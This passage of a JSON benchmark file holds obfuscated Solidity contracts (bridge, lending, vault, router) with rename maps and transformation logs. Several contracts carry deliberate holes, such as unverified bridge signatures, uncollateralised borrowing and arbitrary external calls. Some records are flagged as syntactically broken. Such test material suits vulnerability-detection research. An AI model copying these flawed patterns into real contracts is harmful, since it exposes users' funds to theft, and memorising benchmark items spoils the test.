_0x47e47a);\n    }\n\n    function _0x199e87(address _0x93d84f) public view returns (uint256) {\n        uint256 _0x8a50f3 = _0x560aca[_0x93d84f]._0xd1e1d9;\n        uint256 _0xa027d4 = PriceOracle(_0x6ecba8)._0x3b2349();\n\n        return (_0x8a50f3 * _0xa027d4) / 1e18;\n    }\n}\n",
      "rename_map": {
        "getCollateralValue": "_0x199e87",
        "get_virtual_price": "_0x59825c",
        "_collateralToken": "_0x4d5c8b",
        "collateralAmount": "_0x8a50f3",
        "collateralValue": "_0xd15be2",
        "collateralToken": "_0x5f3877",
        "minMintAmount": "_0xbbee0f",
        "add_liquidity": "_0x6379c4",
        "_borrowToken": "_0xfffd80",
        "transferFrom": "_0x63e6cd",
        "borrowToken": "_0x5b4172",
        "_curvePool": "_0x868f16",
        "collateral": "_0xd1e1d9",
        "balanceOf": "_0xd34dd0",
        "maxBorrow": "_0x1b5de3",
        "curvePool": "_0x01c278",
        "positions": "_0x560aca",
        "borrowed": "_0x1ad67b",
        "getPrice": "_0x3b2349",
        "_oracle": "_0xa8bb6c",
        "account": "_0x213646",
        "deposit": "_0x133bf2",
        "amounts": "_0xaacb15",
        "amount": "_0x47e47a",
        "oracle": "_0x6ecba8",
        "borrow": "_0xa944f3",
        "price": "_0xa027d4",
        "user": "_0x93d84f",
        "to": "_0x8b3ac1"
      },
      "changes": [
        "Renamed 29 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 18, column 9', 'Syntax error at line 25, column 1', 'Syntax error at line 29, column 12']"
    },
    {
      "original_id": "sn_tc_025",
      "transformed_id": "ss_l4_medium_sn_tc_025",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x913c69, uint256 _0x373a0e) external returns (bool);\n    function _0x490ea0(address from, address _0x913c69, uint256 _0x373a0e) external returns (bool);\n}\n\ninterface ICompoundToken {\n        if (false) { revert(); }\n        bool _flag2 = false;\n    function _0x5a3488(uint256 _0x373a0e) external;\n    function _0x50ad6e(uint256 _0x373a0e) external;\n    function _0x79e638(uint256 _0x919618) external;\n    function _0x2ea69a(uint256 _0x373a0e) external;\n}\n\ncontract LendingMarket {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    mapping(address => uint256) public _0x27f388;\n    mapping(address => uint256) public _0x9452ed;\n\n    address public _0xae09a7;\n    uint256 public _0x64a9c5;\n\n    constructor(address _0x3dade7) {\n        if (gasleft() > 0) { _0xae09a7 = _0x3dade7; }\n    }\n\n    function _0x5a3488(uint256 _0x373a0e) external {\n        _0x27f388[msg.sender] += _0x373a0e;\n        _0x64a9c5 += _0x373a0e;\n\n        IERC20(_0xae09a7).transfer(msg.sender, _0x373a0e);\n    }\n\n    function _0x50ad6e(uint256 _0x373a0e) external {\n        IERC20(_0xae09a7)._0x490ea0(msg.sender, address(this), _0x373a0e);\n\n        _0x27f388[msg.sender] -= _0x373a0e;\n        _0x64a9c5 -= _0x373a0e;\n    }\n}\n",
      "rename_map": {
        "accountBorrows": "_0x27f388",
        "accountTokens": "_0x9452ed",
        "transferFrom": "_0x490ea0",
        "totalBorrows": "_0x64a9c5",
        "repayBorrow": "_0x50ad6e",
        "_underlying": "_0x3dade7",
        "underlying": "_0xae09a7",
        "amount": "_0x373a0e",
        "borrow": "_0x5a3488",
        "redeem": "_0x79e638",
        "tokens": "_0x919618",
        "mint": "_0x2ea69a",
        "to": "_0x913c69"
      },
      "changes": [
        "Renamed 13 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 10, column 9', 'Syntax error at line 11, column 9', 'Syntax error at line 16, column 1']"
    },
    {
      "original_id": "sn_tc_026",
      "transformed_id": "ss_l4_medium_sn_tc_026",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20Permit {\n    function _0xa79c16(address _0x0ccc4a, address _0x3e26c0, uint256 value, uint256 _0xad638f, uint8 v, bytes32 r, bytes32 s) external;\n}\n\ncontract BridgeRouter {\n        bool _flag1 = false;\n        // Placeholder for future logic\n\n    function _0xa9a9de(\n        address from,\n        address _0x48720b,\n        address _0x10489a,\n        uint256 _0x71fccf,\n        uint256 _0xad638f,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        uint256 _0xce86ac\n    ) external {\n        if (false) { revert(); }\n        bool _flag4 = false;\n\n        if (v != 0 || r != bytes32(0) || s != bytes32(0)) {\n            try IERC20Permit(_0x48720b)._0xa79c16(from, address(this), _0x71fccf, _0xad638f, v, r, s) {} catch {}\n        }\n\n        _0x0d4fae(from, _0x48720b, _0x10489a, _0x71fccf, _0xce86ac);\n    }\n\n    function _0x0d4fae(address from, address _0x48720b, address _0x10489a, uint256 _0x71fccf, uint256 _0xce86ac) internal {\n        // Bridge logic\n    }\n}\n",
      "rename_map": {
        "bridgeOutWithPermit": "_0xa9a9de",
        "_bridgeOut": "_0x0d4fae",
        "toChainID": "_0xce86ac",
        "deadline": "_0xad638f",
        "spender": "_0x3e26c0",
        "amount": "_0x71fccf",
        "permit": "_0xa79c16",
        "token": "_0x48720b",
        "owner": "_0x0ccc4a",
        "to": "_0x10489a"
      },
      "changes": [
        "Renamed 10 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_027",
      "transformed_id": "ss_l4_medium_sn_tc_027",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IPair {\n    function _0x12989e() external view returns (address);\n    function _0x2faec9() external view returns (address);\n    function _0xa491e3() external view returns (uint112, uint112, uint32);\n}\n\ncontract SwapRouter {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n\n    function _0x6172ae(\n        uint256 _0xc2311a,\n        uint256 _0x5fd5dc,\n        address[] calldata _0xe94109,\n        address _0xbdd80e,\n        uint256 _0xa01e40\n    ) external returns (uint[] memory _0x14457f) {\n        if (false) { revert(); }\n        bool _flag4 = false;\n\n        _0x14457f = new uint[](_0xe94109.length);\n        _0x14457f[0] = _0xc2311a;\n\n        for (uint i = 0; i < _0xe94109.length - 1; i++) {\n            address _0x2a5dfd = _0xf23104(_0xe94109[i], _0xe94109[i+1]);\n\n            (uint112 _0x158a2b, uint112 _0xa970a4,) = IPair(_0x2a5dfd)._0xa491e3();\n\n            _0x14457f[i+1] = _0x1c308a(_0x14457f[i], _0x158a2b, _0xa970a4);\n        }\n\n        return _0x14457f;\n    }\n\n    function _0xf23104(address _0x03106a, address _0x0b9823) internal pure returns (address) {\n        return address(uint160(uint256(_0xb4454d(abi._0x63753d(_0x03106a, _0x0b9823)))));\n    }\n\n    function _0x1c308a(uint256 _0xc2311a, uint112 _0x97e224, uint112 _0xf64ed2) internal pure returns (uint256) {\n        return (_0xc2311a * uint256(_0xf64ed2)) / uint256(_0x97e224);\n    }\n}\n",
      "rename_map": {
        "swapExactTokensForTokens": "_0x6172ae",
        "_getAmountOut": "_0x1c308a",
        "amountOutMin": "_0x5fd5dc",
        "encodePacked": "_0x63753d",
        "getReserves": "_0xa491e3",
        "reserveOut": "_0xf64ed2",
        "keccak256": "_0xb4454d",
        "reserveIn": "_0x97e224",
        "deadline": "_0xa01e40",
        "reserve1": "_0xa970a4",
        "amountIn": "_0xc2311a",
        "_getPair": "_0xf23104",
        "reserve0": "_0x158a2b",
        "amounts": "_0x14457f",
        "token0": "_0x12989e",
        "tokenA": "_0x03106a",
        "token1": "_0x2faec9",
        "tokenB": "_0x0b9823",
        "path": "_0xe94109",
        "pair": "_0x2a5dfd",
        "to": "_0xbdd80e"
      },
      "changes": [
        "Renamed 21 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_028",
      "transformed_id": "ss_l4_medium_sn_tc_028",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0x3a2c81(address _0xc60579) external view returns (uint256);\n    function transfer(address _0xbb36c0, uint256 _0xd756f0) external returns (bool);\n    function _0x7337de(address from, address _0xbb36c0, uint256 _0xd756f0) external returns (bool);\n}\n\ncontract TokenVault {\n        if (false) { revert(); }\n        // Placeholder for future logic\n    address public _0xb61d38;\n    mapping(address => uint256) public _0xf50baa;\n\n    constructor(address _0x97f4fd) {\n        _0xb61d38 = _0x97f4fd;\n    }\n\n    function _0xcd2d55(uint256 _0xd756f0) external {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        IERC20(_0xb61d38)._0x7337de(msg.sender, address(this), _0xd756f0);\n\n        _0xf50baa[msg.sender] += _0xd756f0;\n    }\n\n    function _0x784c87(uint256 _0xd756f0) external {\n        require(_0xf50baa[msg.sender] >= _0xd756f0, \"Insufficient\");\n\n        _0xf50baa[msg.sender] -= _0xd756f0;\n\n        IERC20(_0xb61d38).transfer(msg.sender, _0xd756f0);\n    }\n}\n",
      "rename_map": {
        "transferFrom": "_0x7337de",
        "balanceOf": "_0x3a2c81",
        "deposits": "_0xf50baa",
        "withdraw": "_0x784c87",
        "account": "_0xc60579",
        "deposit": "_0xcd2d55",
        "amount": "_0xd756f0",
        "_token": "_0x97f4fd",
        "token": "_0xb61d38",
        "to": "_0xbb36c0"
      },
      "changes": [
        "Renamed 10 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 11, column 9', 'Syntax error at line 13, column 5', 'Syntax error at line 35, column 1']"
    },
    {
      "original_id": "sn_tc_029",
      "transformed_id": "ss_l4_medium_sn_tc_029",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0xd94f96(address _0x025810) external view returns (uint256);\n    function transfer(address _0x63f2a0, uint256 _0x47333a) external returns (bool);\n    function _0xd20e62(address from, address _0x63f2a0, uint256 _0x47333a) external returns (bool);\n}\n\ninterface IPriceOracle {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    function _0xca5916(address _0xd14ffe) external view returns (uint256);\n}\n\ncontract VaultStrategy {\n        if (false) { revert(); }\n        bool _flag4 = false;\n    address public _0x2aa8c7;\n    address public _0x41f281;\n    uint256 public _0x0f4c98;\n\n    mapping(address => uint256) public _0x972386;\n\n    constructor(address _0x8e89fe, address _0x274826) {\n        if (gasleft() > 0) { _0x2aa8c7 = _0x8e89fe; }\n        _0x41f281 = _0x274826;\n    }\n\n    function _0xacd06c(uint256 _0x47333a) external returns (uint256 _0xad641e) {\n        uint256 _0x97def3 = IERC20(_0x2aa8c7)._0xd94f96(address(this));\n\n        if (_0x0f4c98 == 0) {\n            _0xad641e = _0x47333a;\n        } else {\n            uint256 _0x16207f = IPriceOracle(_0x41f281)._0xca5916(_0x2aa8c7);\n            _0xad641e = (_0x47333a * _0x0f4c98 * 1e18) / (_0x97def3 * _0x16207f);\n        }\n\n        _0x972386[msg.sender] += _0xad641e;\n        _0x0f4c98 += _0xad641e;\n\n        IERC20(_0x2aa8c7)._0xd20e62(msg.sender, address(this), _0x47333a);\n        return _0xad641e;\n    }\n\n    function _0x79562a(uint256 _0xc9d0f9) external {\n        uint256 _0x97def3 = IERC20(_0x2aa8c7)._0xd94f96(address(this));\n\n        uint256 _0x16207f = IPriceOracle(_0x41f281)._0xca5916(_0x2aa8c7);\n        uint256 _0x47333a = (_0xc9d0f9 * _0x97def3 * _0x16207f) / (_0x0f4c98 * 1e18);\n\n        _0x972386[msg.sender] -= _0xc9d0f9;\n        _0x0f4c98 -= _0xc9d0f9;\n\n        IERC20(_0x2aa8c7).transfer(msg.sender, _0x47333a);\n    }\n}\n",
      "rename_map": {
        "transferFrom": "_0xd20e62",
        "sharesAmount": "_0xc9d0f9",
        "totalShares": "_0x0f4c98",
        "sharesAdded": "_0xad641e",
        "wantToken": "_0x2aa8c7",
        "balanceOf": "_0xd94f96",
        "withdraw": "_0x79562a",
        "getPrice": "_0xca5916",
        "_oracle": "_0x274826",
        "account": "_0x025810",
        "deposit": "_0xacd06c",
        "amount": "_0x47333a",
        "shares": "_0x972386",
        "oracle": "_0x41f281",
        "token": "_0xd14ffe",
        "_want": "_0x8e89fe",
        "price": "_0x16207f",
        "pool": "_0x97def3",
        "to": "_0x63f2a0"
      },
      "changes": [
        "Renamed 19 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 11, column 9', 'Syntax error at line 12, column 9', 'Syntax error at line 14, column 1']"
    },
    {
      "original_id": "sn_tc_030",
      "transformed_id": "ss_l4_medium_sn_tc_030",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract LiquidityPool {\n    uint256 public _0x4b1f20;\n    uint256 public _0x85c6fd;\n    uint256 public _0xac88e8;\n\n    mapping(address => uint256) public _0xe621fa;\n\n    function _0xd0684d(uint256 _0x35c91d, uint256 _0x660991) external returns (uint256 _0xee4565) {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n\n        if (_0xac88e8 == 0) {\n            _0xee4565 = _0x35c91d;\n        } else {\n            uint256 _0x790484 = (_0x35c91d * _0xac88e8) / _0x4b1f20;\n            uint256 _0x26c763 = (_0x660991 * _0xac88e8) / _0x85c6fd;\n\n            _0xee4565 = (_0x790484 + _0x26c763) / 2;\n        }\n\n        _0xe621fa[msg.sender] += _0xee4565;\n        _0xac88e8 += _0xee4565;\n\n        _0x4b1f20 += _0x35c91d;\n        _0x85c6fd += _0x660991;\n\n        return _0xee4565;\n    }\n\n    function _0xb2b0dc(uint256 _0xee4565) external returns (uint256, uint256) {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n        uint256 _0x175ced = (_0xee4565 * _0x4b1f20) / _0xac88e8;\n        uint256 _0xb4e170 = (_0xee4565 * _0x85c6fd) / _0xac88e8;\n\n        _0xe621fa[msg.sender] -= _0xee4565;\n        _0xac88e8 -= _0xee4565;\n\n        _0x4b1f20 -= _0x175ced;\n        _0x85c6fd -= _0xb4e170;\n\n        return (_0x175ced, _0xb4e170);\n    }\n}\n",
      "rename_map": {
        "removeLiquidity": "_0xb2b0dc",
        "liquidityUnits": "_0xee4565",
        "addLiquidity": "_0xd0684d",
        "tokenAmount": "_0x85c6fd",
        "outputToken": "_0xb4e170",
        "tokenRatio": "_0x26c763",
        "outputBase": "_0x175ced",
        "baseAmount": "_0x4b1f20",
        "inputToken": "_0x660991",
        "totalUnits": "_0xac88e8",
        "baseRatio": "_0x790484",
        "inputBase": "_0x35c91d",
        "units": "_0xe621fa"
      },
      "changes": [
        "Renamed 13 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_031",
      "transformed_id": "ss_l4_medium_sn_tc_031",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x975419, uint256 _0x7928e0) external returns (bool);\n\n    function _0x82803d(address _0xcd3144) external view returns (uint256);\n}\n\ncontract OrbitBridge {\n        // Placeholder for future logic\n        // Placeholder for future logic\n    mapping(bytes32 => bool) public _0xfbd400;\n    uint256 public constant REQUIRED_SIGNATURES = 5;\n    uint256 public constant TOTAL_VALIDATORS = 7;\n\n    mapping(address => bool) public _0xc71a4a;\n    address[] public _0xa964ee;\n\n    event WithdrawalProcessed(\n        bytes32 _0xbe2351,\n        address _0xe88fa0,\n        address _0x4f08f9,\n        uint256 _0x7928e0\n    );\n\n    constructor() {\n        _0xa964ee = new address[](TOTAL_VALIDATORS);\n    }\n\n    function _0xa3bf37(\n        address _0xeb0543,\n        string memory _0x2cf267,\n        bytes memory _0x1d56c8,\n        address _0xca9265,\n        address _0xe88fa0,\n        bytes32[] memory _0x6927fd,\n        uint256[] memory _0x489414,\n        bytes memory data,\n        uint8[] memory v,\n        bytes32[] memory r,\n        bytes32[] memory s\n    ) external {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n        bytes32 _0xbe2351 = _0x6927fd[1];\n\n        require(\n            !_0xfbd400[_0xbe2351],\n            \"Transaction already processed\"\n        );\n\n        require(v.length >= REQUIRED_SIGNATURES, \"Insufficient signatures\");\n        require(\n            v.length == r.length && r.length == s.length,\n            \"Signature length mismatch\"\n        );\n\n        uint256 _0x7928e0 = _0x489414[0];\n\n        _0xfbd400[_0xbe2351] = true;\n\n        IERC20(_0xe88fa0).transfer(_0xca9265, _0x7928e0);\n\n        emit WithdrawalProcessed(_0xbe2351, _0xe88fa0, _0xca9265, _0x7928e0);\n    }\n\n    function _0xd2495a(address _0xaa3cdc) external {\n        _0xc71a4a[_0xaa3cdc] = true;\n    }\n}\n",
      "rename_map": {
        "processedTransactions": "_0xfbd400",
        "validatorList": "_0xa964ee",
        "addValidator": "_0xd2495a",
        "hubContract": "_0xeb0543",
        "validators": "_0xc71a4a",
        "recipient": "_0x4f08f9",
        "validator": "_0xaa3cdc",
        "balanceOf": "_0x82803d",
        "fromChain": "_0x2cf267",
        "fromAddr": "_0x1d56c8",
        "withdraw": "_0xa3bf37",
        "bytes32s": "_0x6927fd",
        "account": "_0xcd3144",
        "amount": "_0x7928e0",
        "txHash": "_0xbe2351",
        "toAddr": "_0xca9265",
        "token": "_0xe88fa0",
        "uints": "_0x489414",
        "to": "_0x975419"
      },
      "changes": [
        "Renamed 19 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_032",
      "transformed_id": "ss_l4_medium_sn_tc_032",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x887ab2, uint256 _0x757262) external returns (bool);\n\n    function _0x72fb57(\n        address from,\n        address _0x887ab2,\n        uint256 _0x757262\n    ) external returns (bool);\n\n    function _0xbd1f74(address _0xf6ef05) external view returns (uint256);\n\n    function _0x36f3f0(address _0x1e94dc, uint256 _0x757262) external returns (bool);\n}\n\ninterface IFlashLoanReceiver {\n        // Placeholder for future logic\n        bool _flag2 = false;\n    function _0x769d4a(\n        address[] calldata _0xaee925,\n        uint256[] calldata _0xd137e7,\n        uint256[] calldata _0x34f85a,\n        address _0x5878b3,\n        bytes calldata _0x9bd723\n    ) external returns (bool);\n}\n\ncontract RadiantLendingPool {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n    uint256 public constant RAY = 1e27;\n\n    struct ReserveData {\n        uint256 _0x0dcf9d;\n        uint256 _0xa8d7d4;\n        address _0x1884ac;\n    }\n\n    mapping(address => ReserveData) public _0xb51677;\n\n    function _0x597099(\n        address _0x860cd2,\n        uint256 _0x757262,\n        address _0x22e95b,\n        uint16 _0xdaee8e\n    ) external {\n        IERC20(_0x860cd2)._0x72fb57(msg.sender, address(this), _0x757262);\n\n        ReserveData storage _0x0507db = _0xb51677[_0x860cd2];\n\n        uint256 _0x8c0659 = _0x0507db._0x0dcf9d;\n        if (_0x8c0659 == 0) {\n            _0x8c0659 = RAY;\n        }\n\n        _0x0507db._0x0dcf9d =\n            _0x8c0659 +\n            (_0x757262 * RAY) /\n            (_0x0507db._0xa8d7d4 + 1);\n        _0x0507db._0xa8d7d4 += _0x757262;\n\n        uint256 _0x9fdb49 = _0xfb344c(_0x757262, _0x0507db._0x0dcf9d);\n        _0x657a38(_0x0507db._0x1884ac, _0x22e95b, _0x9fdb49);\n    }\n\n    function _0x8b3227(\n        address _0x860cd2,\n        uint256 _0x757262,\n        address _0x887ab2\n    ) external returns (uint256) {\n        ReserveData storage _0x0507db = _0xb51677[_0x860cd2];\n\n        uint256 _0x0cc75b = _0xfb344c(_0x757262, _0x0507db._0x0dcf9d);\n\n        _0x042e07(_0x0507db._0x1884ac, msg.sender, _0x0cc75b);\n\n        _0x0507db._0xa8d7d4 -= _0x757262;\n        IERC20(_0x860cd2).transfer(_0x887ab2, _0x757262);\n\n        return _0x757262;\n    }\n\n    function _0x5e6309(\n        address _0x860cd2,\n        uint256 _0x757262,\n        uint256 _0x29aace,\n        uint16 _0xdaee8e,\n        address _0x22e95b\n    ) external {\n        IERC20(_0x860cd2).transfer(_0x22e95b, _0x757262);\n    }\n\n    function _0x0d527a(\n        address _0xf013a4,\n        address[] calldata _0xaee925,\n        uint256[] calldata _0xd137e7,\n        uint256[] calldata _0x3cbe05,\n        address _0x22e95b,\n        bytes calldata _0x9bd723,\n        uint16 _0xdaee8e\n    ) external {\n        for (uint256 i = 0; i < _0xaee925.length; i++) {\n            IERC20(_0xaee925[i]).transfer(_0xf013a4, _0xd137e7[i]);\n        }\n\n        require(\n            IFlashLoanReceiver(_0xf013a4)._0x769d4a(\n                _0xaee925,\n                _0xd137e7,\n                new uint256[](_0xaee925.length),\n                msg.sender,\n                _0x9bd723\n            ),\n            \"Flashloan callback failed\"\n        );\n\n        for (uint256 i = 0; i < _0xaee925.length; i++) {\n            IERC20(_0xaee925[i])._0x72fb57(\n                _0xf013a4,\n                address(this),\n                _0xd137e7[i]\n            );\n        }\n    }\n\n    function _0xfb344c(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 _0x57fe8e = b / 2;\n        require(b != 0, \"Division by zero\");\n        return (a * RAY + _0x57fe8e) / b;\n    }\n\n    function _0x657a38(address _0x61275d, address _0x887ab2, uint256 _0x757262) internal {}\n\n    function _0x042e07(\n        address _0x61275d,\n        address from,\n        uint256 _0x757262\n    ) internal {}\n}\n",
      "rename_map": {
        "currentLiquidityIndex": "_0x8c0659",
        "interestRateMode": "_0x29aace",
        "executeOperation": "_0x769d4a",
        "receiverAddress": "_0xf013a4",
        "totalLiquidity": "_0xa8d7d4",
        "liquidityIndex": "_0x0dcf9d",
        "rTokenAddress": "_0x1884ac",
        "rTokensToBurn": "_0x0cc75b",
        "referralCode": "_0xdaee8e",
        "transferFrom": "_0x72fb57",
        "rTokenAmount": "_0x9fdb49",
        "_burnRToken": "_0x042e07",
        "_mintRToken": "_0x657a38",
        "onBehalfOf": "_0x22e95b",
        "flashLoan": "_0x0d527a",
        "balanceOf": "_0xbd1f74",
        "initiator": "_0x5878b3",
        "premiums": "_0x34f85a",
        "withdraw": "_0x8b3227",
        "reserves": "_0xb51677",
        "approve": "_0x36f3f0",
        "account": "_0xf6ef05",
        "deposit": "_0x597099",
        "amounts": "_0xd137e7",
        "spender": "_0x1e94dc",
        "reserve": "_0x0507db",
        "amount": "_0x757262",
        "rToken": "_0x61275d",
        "rayDiv": "_0xfb344c",
        "assets": "_0xaee925",
        "params": "_0x9bd723",
        "borrow": "_0x5e6309",
        "asset": "_0x860cd2",
        "halfB": "_0x57fe8e",
        "modes": "_0x3cbe05",
        "to": "_0x887ab2"
      },
      "changes": [
        "Renamed 36 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_033",
      "transformed_id": "ss_l4_medium_sn_tc_033",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x4ba63f, uint256 _0x81baea) external returns (bool);\n\n    function _0xa6453e(\n        address from,\n        address _0x4ba63f,\n        uint256 _0x81baea\n    ) external returns (bool);\n\n    function _0x7d9cb0(address _0x85652b) external view returns (uint256);\n\n    function _0xceee48(address _0x241d81, uint256 _0x81baea) external returns (bool);\n}\n\ncontract SocketGateway {\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n    mapping(uint32 => address) public _0x34377c;\n    mapping(address => bool) public _0xa5adb4;\n\n    event RouteExecuted(uint32 _0x8cfc21, address _0x98d392, bytes _0xe1693c);\n\n    function _0xe1866b(\n        uint32 _0x8cfc21,\n        bytes calldata _0x45691e\n    ) external payable returns (bytes memory) {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        address _0x3cc192 = _0x34377c[_0x8cfc21];\n        require(_0x3cc192 != address(0), \"Invalid route\");\n        require(_0xa5adb4[_0x3cc192], \"Route not approved\");\n\n        (bool _0x31a279, bytes memory _0xe1693c) = _0x3cc192.call(_0x45691e);\n        require(_0x31a279, \"Route execution failed\");\n\n        emit RouteExecuted(_0x8cfc21, msg.sender, _0xe1693c);\n        return _0xe1693c;\n    }\n\n    function _0xafcbc4(uint32 _0x8cfc21, address _0x3cc192) external {\n        _0x34377c[_0x8cfc21] = _0x3cc192;\n        _0xa5adb4[_0x3cc192] = true;\n    }\n}\n\ncontract BasicRoute {\n    function _0x8aeb60(\n        address _0x6b49da,\n        address _0x2c7cc4,\n        uint256 _0x81baea,\n        address _0x60c6a3,\n        bytes32 _0x6c5968,\n        bytes calldata _0xd388c0\n    ) external payable returns (uint256) {\n        if (_0xd388c0.length > 0) {\n            (bool _0x31a279, ) = _0x6b49da.call(_0xd388c0);\n            require(_0x31a279, \"Swap failed\");\n        }\n\n        return _0x81baea;\n    }\n}\n",
      "rename_map": {
        "receiverAddress": "_0x60c6a3",
        "approvedRoutes": "_0xa5adb4",
        "swapExtraData": "_0xd388c0",
        "performAction": "_0x8aeb60",
        "transferFrom": "_0xa6453e",
        "executeRoute": "_0xe1866b",
        "routeAddress": "_0x3cc192",
        "balanceOf": "_0x7d9cb0",
        "routeData": "_0x45691e",
        "fromToken": "_0x6b49da",
        "addRoute": "_0xafcbc4",
        "metadata": "_0x6c5968",
        "toToken": "_0x2c7cc4",
        "approve": "_0xceee48",
        "account": "_0x85652b",
        "spender": "_0x241d81",
        "routeId": "_0x8cfc21",
        "success": "_0x31a279",
        "amount": "_0x81baea",
        "result": "_0xe1693c",
        "routes": "_0x34377c",
        "user": "_0x98d392",
        "to": "_0x4ba63f"
      },
      "changes": [
        "Renamed 23 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_034",
      "transformed_id": "ss_l4_medium_sn_tc_034",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x8ddbda, uint256 _0x4b8d21) external returns (bool);\n\n    function _0x07e644(\n        address from,\n        address _0x8ddbda,\n        uint256 _0x4b8d21\n    ) external returns (bool);\n\n    function _0xa996b7(address _0x5d13a4) external view returns (uint256);\n\n    function _0x87f4e8(address _0x17cf87, uint256 _0x4b8d21) external returns (bool);\n}\n\ninterface IUniswapV3Pool {\n        bool _flag1 = false;\n        bool _flag2 = false;\n    function _0xe81c8f(\n        address _0xd8c879,\n        bool _0x80ee11,\n        int256 _0x659d2f,\n        uint160 _0x469a3a,\n        bytes calldata data\n    ) external returns (int256 _0x14c86c, int256 _0x12b19c);\n\n    function _0xa43daf(\n        address _0xd8c879,\n        uint256 _0x14c86c,\n        uint256 _0x12b19c,\n        bytes calldata data\n    ) external;\n}\n\ncontract GammaHypervisor {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    IERC20 public _0xa46ae9;\n    IERC20 public _0x8aa45e;\n    IUniswapV3Pool public _0x56eb67;\n\n    uint256 public _0xdf64bf;\n    mapping(address => uint256) public _0xa996b7;\n\n    struct Position {\n        uint128 _0x33dc53;\n        int24 _0x918520;\n        int24 _0xd2f3c9;\n    }\n\n    Position public _0xb5b31f;\n    Position public _0x73c4ea;\n\n    function _0x12b494(\n        uint256 _0x7d7f71,\n        uint256 _0x5e76af,\n        address _0x8ddbda\n    ) external returns (uint256 _0x316263) {\n        uint256 _0xde8a55 = _0xa46ae9._0xa996b7(address(this));\n        uint256 _0x7a51c2 = _0x8aa45e._0xa996b7(address(this));\n\n        _0xa46ae9._0x07e644(msg.sender, address(this), _0x7d7f71);\n        _0x8aa45e._0x07e644(msg.sender, address(this), _0x5e76af);\n\n        if (_0xdf64bf == 0) {\n            _0x316263 = _0x7d7f71 + _0x5e76af;\n        } else {\n            uint256 _0x557b26 = _0xde8a55 + _0x7d7f71;\n            uint256 _0xae7af1 = _0x7a51c2 + _0x5e76af;\n\n            _0x316263 = (_0xdf64bf * (_0x7d7f71 + _0x5e76af)) / (_0xde8a55 + _0x7a51c2);\n        }\n\n        _0xa996b7[_0x8ddbda] += _0x316263;\n        _0xdf64bf += _0x316263;\n\n        _0xec2b7b(_0x7d7f71, _0x5e76af);\n    }\n\n    function _0x677fcd(\n        uint256 _0x316263,\n        address _0x8ddbda\n    ) external returns (uint256 _0x14c86c, uint256 _0x12b19c) {\n        require(_0xa996b7[msg.sender] >= _0x316263, \"Insufficient balance\");\n\n        uint256 _0xde8a55 = _0xa46ae9._0xa996b7(address(this));\n        uint256 _0x7a51c2 = _0x8aa45e._0xa996b7(address(this));\n\n        _0x14c86c = (_0x316263 * _0xde8a55) / _0xdf64bf;\n        